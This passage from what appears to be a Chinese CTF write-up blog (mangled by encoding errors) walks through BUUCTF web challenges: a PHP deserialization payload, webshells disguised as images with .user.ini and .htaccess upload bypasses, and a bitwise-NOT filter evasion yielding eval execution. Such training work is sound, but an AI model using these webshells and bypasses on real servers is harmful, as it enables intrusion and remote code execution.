<span class=\"hljs-built_in\">to</span> <span class=\"hljs-keyword\">the</span> zjctf<br></code></pre></td></tr></table></figure>\n\n<p>ç¬¬äºŒä¸ª</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">include</span>(<span class=\"hljs-variable\">$file</span>);  <span class=\"hljs-comment\">//useless.php</span><br></code></pre></td></tr></table></figure>\n\n<p>ä¸€ä¸ªæ–‡ä»¶åŒ…å«ï¼Œå°è¯•ç”¨php:&#x2F;&#x2F;filterè¯»å–<code>useless.php</code></p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vim\">&amp;<span class=\"hljs-keyword\">file</span>=php://<span class=\"hljs-built_in\">filter</span>/<span class=\"hljs-keyword\">read</span>=conver.base64-encode/resource=useless.php<br></code></pre></td></tr></table></figure>\n\n<p>è‡³äºpasswordï¼ŒçŒœæµ‹åº”è¯¥æ˜¯åœ¨useless.phpé‡Œæ‰æœ‰çº¿ç´¢ï¼Œå…ˆèµ‹å€¼1çœ‹çœ‹</p>\n<p>äºæ˜¯å…ˆæ„é€ ä¸€ä¸ªpayload</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?<span class=\"hljs-type\">text</span>=data://<span class=\"hljs-type\">text</span>/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://<span class=\"hljs-keyword\">filter</span>/<span class=\"hljs-keyword\">read</span>=convert.base64-encode/resource=useless.php&amp;<span class=\"hljs-keyword\">password</span>=<span class=\"hljs-number\">1</span><br></code></pre></td></tr></table></figure>\n\n<p>å¾—åˆ°<code>useless.php</code>å†…å®¹</p>\n<p><img src=\"/post/wp-buuctf/image-20220823175723137.png\" alt=\"image-20220823175723137\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo<br><br>è§£ç å<br><br><span class=\"hljs-meta\">&lt;?php</span>  <br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Flag</span></span>&#123;  <span class=\"hljs-comment\">//flag.php  </span><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$file</span>;  <br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__tostring</span>(<span class=\"hljs-params\"></span>)</span>&#123;  <br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable language_\">$this</span>-&gt;file))&#123;  <br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">file_get_contents</span>(<span class=\"hljs-variable\">$this</span>-&gt;file); <br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;br&gt;&quot;</span>;<br>        <span class=\"hljs-keyword\">return</span> (<span class=\"hljs-string\">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class=\"hljs-meta\">?&gt;</span>  <br></code></pre></td></tr></table></figure>\n\n<p>å†çœ‹çœ‹passwordå˜é‡</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-variable\">$password</span> = <span class=\"hljs-title function_ invoke__\">unserialize</span>(<span class=\"hljs-variable\">$password</span>);<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$password</span>;<br></code></pre></td></tr></table></figure>\n<p>è¿™é‡Œç”¨äº†ååºåˆ—åŒ–ï¼Œæ‰€ä»¥passwordå°±æ˜¯åºåˆ—åŒ–åçš„å€¼</p>\n<p>åˆ©ç”¨<code>useless.php</code>æ„é€ åºåˆ—åŒ–</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>  <br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Flag</span></span>&#123; <br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$file</span>=<span class=\"hljs-string\">&quot;flag.php&quot;</span> ;  <br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__tostring</span>(<span class=\"hljs-params\"></span>)</span>&#123;  <br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable language_\">$this</span>-&gt;file))&#123;  <br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">file_get_contents</span>(<span class=\"hljs-variable\">$this</span>-&gt;file); <br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;br&gt;&quot;</span>;<br>        <span class=\"hljs-keyword\">return</span> (<span class=\"hljs-string\">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class=\"hljs-variable\">$password</span> = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Flag</span>();<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">serialize</span>(<span class=\"hljs-variable\">$password</span>);<br><span class=\"hljs-meta\">?&gt;</span>  <br></code></pre></td></tr></table></figure>\n\n<p>è¿è¡Œå        </p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">O</span>:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">&quot;Flag&quot;</span>:<span class=\"hljs-number\">1</span>:&#123;s:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">&quot;file&quot;</span>;s:<span class=\"hljs-number\">8</span>:<span class=\"hljs-string\">&quot;flag.php&quot;</span>;&#125;  <br></code></pre></td></tr></table></figure>\n\n<p>æœ€åpayload</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?<span class=\"hljs-type\">text</span>=data://<span class=\"hljs-type\">text</span>/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;<span class=\"hljs-keyword\">password</span>=O:<span class=\"hljs-number\">4</span>:&quot;Flag&quot;:<span class=\"hljs-number\">1</span>:&#123;s:<span class=\"hljs-number\">4</span>:&quot;file&quot;;s:<span class=\"hljs-number\">8</span>:&quot;flag.php&quot;;&#125;<br><br>//ä»”ç»†ä¸€ä¸‹ä¼šæ³¨æ„åˆ°è¿™é‡Œçš„fileçš„å€¼ä¸­ï¼Œä¼ªåè®®åˆ é™¤äº†ï¼Œ<br>è¿™æ˜¯å› ä¸ºå¼€å§‹é»˜è®¤éƒ½æ˜¯<span class=\"hljs-keyword\">index</span>.phpï¼Œä½†æ˜¯<span class=\"hljs-keyword\">index</span>.phpæ²¡æœ‰Flagç±»ï¼Œ<br>å¦‚æœæƒ³æ‰§è¡Œååºåˆ—åŒ–ï¼Œé‚£å°±éœ€è¦åŒ…å«Flagç±»ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œçš„useless.phpé‡Œçš„<br>æ‰€ä»¥è¿™é‡Œåˆ é™¤fileé‡Œçš„ä¼ªåè®®ï¼Œåªç•™useless.phpçš„æ–‡ä»¶å<br>å°±æ˜¯åˆ©ç”¨  <span class=\"hljs-keyword\">include</span>($file); <br>æŠŠuseless.phpåŒ…å«åœ¨<span class=\"hljs-keyword\">index</span>.phpé‡Œï¼Œä»è€Œå¯ä»¥æˆåŠŸæ‰§è¡Œååºåˆ—åŒ–ï¼Œå¾—åˆ°flag<br></code></pre></td></tr></table></figure>\n\n<p>å¾—åˆ°flag</p>\n<h2 id=\"9-SUCTF-2019-CheckIn\"><a href=\"#9-SUCTF-2019-CheckIn\" class=\"headerlink\" title=\"9.[SUCTF 2019]CheckIn\"></a>9.[SUCTF 2019]CheckIn</h2><h3 id=\"1-é¢˜ç›®æè¿°-6\"><a href=\"#1-é¢˜ç›®æè¿°-6\" class=\"headerlink\" title=\"1)é¢˜ç›®æè¿°\"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>\n<h3 id=\"2-wp-6\"><a href=\"#2-wp-6\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>å…ˆä¸Šä¼ ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶è¯•è¯•</p>\n<p><img src=\"/post/wp-buuctf/image-20220825173012665.png\" alt=\"image-20220825173012665\"></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs\">exif_imagetypeæ˜¯åˆ¤æ–­ä¸€ä¸ªå›¾åƒçš„ç±»å‹çš„è¿›ç¨‹ã€‚<br></code></pre></td></tr></table></figure>\n\n<p>æ‰€ä»¥åªèƒ½ä¸Šä¼ å›¾ç‰‡</p>\n<p>å…ˆä¸Šä¼ ä¸€ä¸ªåŒ…å«PHPæœ¨é©¬çš„å›¾ç‰‡é©¬è¯•è¯•</p>\n<p><img src=\"/post/wp-buuctf/image-20220825174837632.png\" alt=\"image-20220825174837632\"></p>\n<p>çœ‹æ¥æ˜¯è¿‡æ»¤äº†<code>&lt;?</code>ï¼Œæ‰€ä»¥é™¤äº†php,å…¶ä»–çš„asp,aspx,jsp,jséƒ½å¯ä»¥ç»•è¿‡</p>\n<p>è¿™é‡Œä»¥jsä¸¾ä¾‹</p>\n<p>åˆ›å»ºä¸€ä¸ªjsæ–‡ä»¶ï¼Œå†…å®¹ä¸º</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">&lt;script language=<span class=\"hljs-string\">&quot;php&quot;</span>&gt;@<span class=\"hljs-built_in\">eval</span>($_POST[<span class=\"hljs-string\">&quot;cmd&quot;</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure>\n\n<p>åœ¨å’Œä¸€ä¸ªæ™®é€šå›¾ç‰‡åˆæˆï¼Œä¹Ÿå¯ä»¥åŠ ä¸ªæ–‡ä»¶å¤´GIF89a</p>\n<p>å›¾ç‰‡é©¬åä¸º<code>haha.gif</code></p>\n<p>ç„¶åä¸Šä¼ </p>\n<p><img src=\"/post/wp-buuctf/image-20220825210858681.png\" alt=\"image-20220825210858681\"></p>\n<p>ç”±äºä¸æ˜¯phpæœ¨é©¬ï¼Œæ‰€ä»¥æ— æ³•ç”¨<code>.htaccess</code>æ–‡ä»¶ç»•è¿‡</p>\n<p>è¿™é‡Œå°±éœ€è¦ç”¨<code>.user.ini</code>é…ç½®æ–‡ä»¶,å½“ç„¶ä½¿ç”¨å‰ææ˜¯<code>.user.ini</code>æ–‡ä»¶ä¸‹æœ‰phpæ–‡ä»¶ï¼Œä¸ç„¶ä¹Ÿä¸èƒ½åŒ…å«äº†</p>\n<p>æ¨èçœ‹ä¸€ä¸‹è¿™ç¯‡<a href=\"https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html\">æ–‡ç« </a></p>\n<p><strong>åœ¨æœåŠ¡å™¨ä¸­ï¼Œåªè¦æ˜¯è¿ç”¨äº†fastcgiçš„æœåŠ¡å™¨å°±èƒ½å¤Ÿåˆ©ç”¨è¯¥æ–¹å¼getshellï¼Œä¸è®ºæ˜¯apacheæˆ–è€…ngnixæˆ–æ˜¯å…¶ä»–æœåŠ¡å™¨ã€‚</strong></p>\n<p> <strong>è¿™ä¸ªæ–‡ä»¶æ˜¯php.iniçš„è¡¥å……æ–‡ä»¶ï¼Œå½“ç½‘é¡µè®¿é—®çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ˜¯å¦æœ‰.user.iniï¼Œç„¶åå°†å…¶è¡¥å……è¿›php.iniï¼Œå¹¶ä½œä¸ºcgiçš„å¯åŠ¨é¡¹ã€‚</strong></p>\n<p> <strong>å…¶ä¸­å¾ˆå¤šåŠŸèƒ½è®¾ç½®äº†åªèƒ½php.inié…ç½®ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ä¸€äº›å±é™©çš„åŠŸèƒ½å¯ä»¥è¢«æˆ‘ä»¬æ§åˆ¶ï¼Œæ¯”å¦‚auto_prepend_fileã€‚</strong></p>\n<figure class=\"highlight angelscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs angelscript\"><span class=\"hljs-built_in\">auto</span>_append_fileã€<span class=\"hljs-built_in\">auto</span>_prepend_file:æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°ã€‚è€Œ<span class=\"hljs-built_in\">auto</span>_append_fileç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«ã€‚ <br><br>ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥å†™åœ¨.user.iniä¸­ï¼š<br></code></pre></td></tr></table></figure>\n\n<p>æ‰€ä»¥è¿™é‡Œè®¾ç½®è‡ªåŠ¨åŒ…å«çš„æ–‡ä»¶ä¸º<code>haha.gif</code></p>\n<p>äºæ˜¯<code>.user.ini</code>å†…å®¹ä¸º</p>\n<figure class=\"highlight angelscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs angelscript\">GIF89a       <span class=\"hljs-comment\">//ç»•è¿‡å›¾ç‰‡åˆ¤æ–­         </span><br><span class=\"hljs-built_in\">auto</span>_prepend_file=haha.gif<br></code></pre></td></tr></table></figure>\n\n<p>ä¸Šä¼ <code>.user.ini</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220825214029074.png\" alt=\"image-20220825214029074\"></p>\n<p>è¿™ä¸ªæ—¶å€™haha.gifå°±å·²ç»åŒ…å«åœ¨index.phpï¼Œå¯ä»¥è®¿é—®</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">http</span>://<span class=\"hljs-number\">9</span>c7a4b64-<span class=\"hljs-number\">1</span>c49-<span class=\"hljs-number\">4</span>ee4-a146-dc6763b5ce1c.node4.buuoj.cn:<span class=\"hljs-number\">81</span>/uploads/c47b21fcf8f0bc8b3920541abd8024fd/index.php<br></code></pre></td></tr></table></figure>\n\n<p>èƒ½çœ‹åˆ°<code>GIF98a?</code></p>\n<p>ç„¶åä¹Ÿå¯ä»¥ç”¨hackbarï¼Œpostä¸Šä¼ å‘½ä»¤ï¼Œå¦‚å›¾ä¸­çš„phpinfo()</p>\n<p><img src=\"/post/wp-buuctf/image-20220825215617387.png\" alt=\"image-20220825215617387\"></p>\n<figure class=\"highlight abnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs abnf\"><span class=\"hljs-attribute\">cmd</span><span class=\"hljs-operator\">=</span>var_dump(scandir(<span class=\"hljs-string\">&quot;/&quot;</span>))<span class=\"hljs-comment\">;//çœ‹çœ‹æ ¹ç›®å½•ï¼Œæ‰¾åˆ°flag</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220825220933577.png\" alt=\"image-20220825220933577\"></p>\n<figure class=\"highlight abnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs abnf\"><span class=\"hljs-attribute\">cmd</span><span class=\"hljs-operator\">=</span>var_dump(file_get_contents(<span class=\"hljs-string\">&quot;/flag&quot;</span>))<span class=\"hljs-comment\">;//è¯»å–flagæ–‡ä»¶</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220825221229971.png\" alt=\"image-20220825221229971\"></p>\n<hr>\n<p>å½“ç„¶ç”¨èšå‰‘æœ€ç®€å•ï¼Œè¿æ¥ä¹ŸæˆåŠŸ</p>\n<p><img src=\"/post/wp-buuctf/image-20220825214728996.png\" alt=\"image-20220825214728996\"></p>\n<p>å¯ä»¥çœ‹åˆ°<strong>index.phpæ–‡ä»¶ä¹Ÿåœ¨ä¸Šä¼ çš„ç›®å½•</strong>ä¸‹ï¼Œä¹Ÿå°±æ˜¯<code>.user.ini</code>çš„åŒä¸€ä¸ªç›®å½•ä¸‹ï¼Œæ‰€ä»¥æ‰å¯ä»¥æˆåŠŸåŒ…å«</p>\n<p><img src=\"/post/wp-buuctf/image-20220825215454619.png\" alt=\"image-20220825215454619\"></p>\n<p>åœ¨æ ¹ç›®å½•å‘ç°äº†flagï¼Œæ‰“å¼€å³å¯å¾—åˆ°flag</p>\n<hr>\n<p>ä½†æˆ‘å‘ç°æ ¹ç›®å½•ä¸€ä¸ªclean.shæ–‡ä»¶ï¼Œè¿™æ˜¯ä¸€ä¸ªå®šæ—¶æ¸…ç©ºlinuxæœåŠ¡å™¨ä¸Šç¼“å­˜çš„æ–‡ä»¶è„šæœ¬ï¼Œä¸Šä¼ çš„æ–‡ä»¶ä¼šè¢«å®šæ—¶åˆ é™¤</p>\n<p><img src=\"/post/wp-buuctf/image-20220825215047906.png\" alt=\"image-20220825215047906\"></p>\n<p>è¿™æ˜¯ä¸€åˆ†é’Ÿå·¦å³åï¼Œé¶åœºç¯å¢ƒè¿˜åœ¨ä½†æ˜¯æ— æ³•è®¿é—®äº†ï¼Œæ‰€ä»¥è¦å¿«ç‚¹æ‹¿å–flag</p>\n<p><img src=\"/post/wp-buuctf/image-20220825215220524.png\" alt=\"image-20220825215220524\"></p>\n<p>è¿™é‡Œæœ¬æ¥æƒ³åˆ æ‰clean.shï¼Œå‘ç°æ²¡æƒé™ï¼Œæ— æ³•æ‰§è¡Œï¼Œsudoä¹Ÿä¸è¡Œï¼Œé‚£å°±åªèƒ½é€Ÿæˆ˜é€Ÿå†³äº†</p>\n<p><img src=\"/post/wp-buuctf/image-20220825220024393.png\" alt=\"image-20220825220024393\"></p>\n<p>æ ¹ç›®å½•å¾—åˆ°flag</p>\n<h2 id=\"10-GXYCTF2019-BabyUpload\"><a href=\"#10-GXYCTF2019-BabyUpload\" class=\"headerlink\" title=\"10.[GXYCTF2019]BabyUpload\"></a>10.[GXYCTF2019]BabyUpload</h2><h3 id=\"1-é¢˜ç›®æè¿°-7\"><a href=\"#1-é¢˜ç›®æè¿°-7\" class=\"headerlink\" title=\"1)é¢˜ç›®æè¿°\"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>\n<h3 id=\"2-wp-7\"><a href=\"#2-wp-7\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>è¿™é“é¢˜ä¸éš¾ï¼Œä½†æ˜¯å¼€å§‹ä¸æ¸…æ¥šè¿˜æ˜¯ä¸çŸ¥é“è¿‡æ»¤äº†ä»€ä¹ˆï¼Œ</p>\n<p>è¿™é“é¢˜ä»‹ç»å‡ ä¸ªç‚¹å°±å¯ä»¥äº†</p>\n<p>ç¬¬ä¸€ä¸ªæ˜¯è¿‡æ»¤äº†åç¼€åå«ph</p>\n<p>ç¬¬äºŒä¹Ÿæ˜¯å…³é”®çš„ï¼Œå®ƒåªå…è®¸ä¸Šä¼ <code>content-type: image/jpeg</code>ï¼Œpngå’Œgiféƒ½ä¸å¯ä»¥</p>\n<p>ç¬¬ä¸‰ç‚¹å°±æ˜¯å®ƒè¿‡æ»¤äº†æ–‡ä»¶å†…å®¹é‡Œå«<code>&lt;?</code></p>\n<p>æ‰€ä»¥ä¸Šä¼ ä¸€ä¸ªjpegæ–‡ä»¶ï¼ŒæŠ“åŒ…ä¿®æ”¹å†…å®¹ä¸ºéphpä½†åŒ…å«phpçš„ä¸€ä¸ªè„šæœ¬ï¼Œ</p>\n<figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs jsp\">&lt;script language=<span class=\"hljs-string\">&quot;php&quot;</span>&gt;<span class=\"hljs-meta\">@eval($_POST[&quot;cmd&quot;])</span>;&lt;/script&gt;<br></code></pre></td></tr></table></figure>\n\n<p>å†ä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œè§£ææ‰€æœ‰æ–‡ä»¶ä¸ºphp</p>\n<p>ç”¨èšå‰‘è¿æ¥jpegæ–‡ä»¶ï¼Œå³å¯</p>\n<h2 id=\"11-æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME\"><a href=\"#11-æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME\" class=\"headerlink\" title=\"11.[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME\"></a>11.[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</h2><h3 id=\"1-é¢˜ç›®æè¿°-8\"><a href=\"#1-é¢˜ç›®æè¿°-8\" class=\"headerlink\" title=\"1)é¢˜ç›®æè¿°\"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>\n<h3 id=\"2-wp-8\"><a href=\"#2-wp-8\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>å…ˆå¯¹ä»£ç åˆ†æ</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-title function_ invoke__\">error_reporting</span>(<span class=\"hljs-number\">0</span>);<br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;code&#x27;</span>]))&#123;<br>            <span class=\"hljs-variable\">$code</span>=<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;code&#x27;</span>];<br>                    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-title function_ invoke__\">strlen</span>(<span class=\"hljs-variable\">$code</span>)&gt;<span class=\"hljs-number\">40</span>)&#123;<br>                                        <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;This is too Long.&quot;</span>);<br>                                                &#125;<br>                    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class=\"hljs-variable\">$code</span>))&#123;<br>                                        <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;NO.&quot;</span>);<br>                                                &#125;<br>                    @<span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-variable\">$code</span>);<br>&#125;<br><span class=\"hljs-keyword\">else</span>&#123;<br>            <span class=\"hljs-title function_ invoke__\">highlight_file</span>(<span class=\"hljs-keyword\">__FILE__</span>);<br>&#125;<br><br><span class=\"hljs-comment\">// ?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>å¯ä»¥çœ‹åˆ°codeè¢«æ­£åˆ™åŒ¹é…ï¼Œæ‰€ä»¥å­—æ¯å¤§å°å†™å’Œæ•°å­—éƒ½ä¸èƒ½è¾“å…¥</p>\n<p>è¿™é‡Œå°±å­¦åˆ°æ–°ä¸œè¥¿äº†</p>\n<p><strong>å–åç»•è¿‡</strong></p>\n<p><u><strong>å–å</strong>å°±æ˜¯å°†æ•°å­—è½¬åŒ–ä¸ºäºŒè¿›åˆ¶,å†æŠŠäºŒè¿›åˆ¶ä¸­çš„1å˜æˆ0,0å˜æˆ1</u></p>\n<p><code>~</code>æ˜¯å–åç¬¦å·ï¼Œ</p>\n<figure class=\"highlight mel\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mel\">&lt;?php<br>echo urlencode(~<span class=\"hljs-string\">&#x27;assert&#x27;</span>);<br>echo urlencode(~<span class=\"hljs-string\">&#x27;eval($_REQUEST[8])&#x27;</span>);<br>?&gt;<br><br>ç»“æœï¼š<br>%9E%8C%8C%9A%8D%8B<br>%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6<br><br><span class=\"hljs-comment\">//phpæ–­è¨€ï¼šassert â€” æ£€æŸ¥ä¸€ä¸ªæ–­è¨€æ˜¯å¦ä¸º falseï¼Œå¦‚æœå‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒå°†ä¼šè¢« assert() å½“åš PHP ä»£ç æ¥æ‰§è¡Œ</span><br></code></pre></td></tr></table></figure>\n\n<p>ç„¶åå†èµ‹å€¼</p>\n<figure class=\"highlight mel\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mel\">?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6);<br><br><span class=\"hljs-comment\">//æ³¨æ„åé¢è¦æœ‰ï¼›ï¼Œä»£è¡¨phpä»£ç ç»“æŸ</span><br><span class=\"hljs-comment\">//è¿™é‡Œ~æ˜¯å–åï¼Œä¹‹å‰urlencodeé‡Œå–åäº†ä¸€æ¬¡ï¼Œèµ‹å€¼æ—¶å†å–åä¸€æ¬¡ï¼Œç›¸å½“äºæ²¡æœ‰å–å</span><br><br>ç­‰åŒäº<br><br>?code=(assert)(<span class=\"hljs-keyword\">eval</span>($_REQUEST[<span class=\"hljs-number\">8</span>]));<br><br>(assert)å› ä¸ºæ˜¯assertæ˜¯å‡½æ•°ï¼Œè¢«å½“ä½œå‡½æ•°æ‰§è¡Œï¼Œäºæ˜¯å› ä¸ºæ–­è¨€(<span class=\"hljs-keyword\">eval</span>($_REQUEST[<span class=\"hljs-number\">8</span>]))ï¼Œæ‰€ä»¥æŠŠ<span class=\"hljs-keyword\">eval</span>($_REQUEST[<span class=\"hljs-number\">8</span>])å½“ä½œphpæ‰§è¡Œï¼Œäºæ˜¯å°±å¯ä»¥æ‹¿åˆ°shelläº†<br></code></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight 